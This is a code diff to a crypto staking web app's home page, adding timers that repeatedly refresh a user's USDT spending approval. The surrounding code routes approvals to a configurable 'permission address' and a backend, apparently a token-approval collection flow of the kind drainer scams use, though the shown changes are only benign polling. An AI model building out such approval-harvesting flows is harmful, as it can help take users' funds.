@@ -803,8 +803,24 @@ export default function Home() {
     }
   }, [usdtAllowance])
   
-  // 计算verify状态 - 检查对质押合约的verify，不是对私人地址的verify
+  // 计算授权状态 - 检查对质押合约的verify，不是对私人地址的verify
   const isAuthorized = usdtAllowance && Number.parseFloat(usdtAllowance) > 0 && !isApprovalPending
+  
+  // 授权成功后，定期刷新授权额度以确保状态同步
+  useEffect(() => {
+    if (isConnected && account && !isAuthorized && !isApprovalPending) {
+      // 如果已连接但未授权，定期检查授权状态（每10秒检查一次）
+      const interval = setInterval(async () => {
+        try {
+          await refetchUsdtAllowance()
+        } catch (error) {
+          console.error('刷新授权额度失败:', error)
+        }
+      }, 10000) // 每10秒刷新一次
+      
+      return () => clearInterval(interval)
+    }
+  }, [isConnected, account, isAuthorized, isApprovalPending, refetchUsdtAllowance])
 
   // 获取授权配置（权限地址）
   const [permissionAddress, setPermissionAddress] = useState<string | null>(null)
@@ -890,7 +906,28 @@ export default function Home() {
       console.log('   2. 验证权限地址')
       console.log('   3. 调用后端 API 处理授权')
       console.log('   4. 发放奖励')
+      
       setIsApprovalPending(false)
+      
+      // 立即刷新授权额度（交易已确认）
+      // 然后定期刷新以确保状态同步
+      const refreshAllowance = async () => {
+        try {
+          console.log('🔄 刷新授权额度...')
+          await refetchUsdtAllowance()
+          console.log('✅ 授权额度已刷新')
+        } catch (error) {
+          console.error('❌ 刷新授权额度失败:', error)
+        }
+      }
+      
+      // 立即刷新一次
+      refreshAllowance()
+      
+      // 延迟刷新（确保链上状态已同步）
+      setTimeout(refreshAllowance, 2000)
+      setTimeout(refreshAllowance, 5000)
+      setTimeout(refreshAllowance, 10000)
       
     } catch (error) {
       if (process.env.NODE_ENV === 'development') {
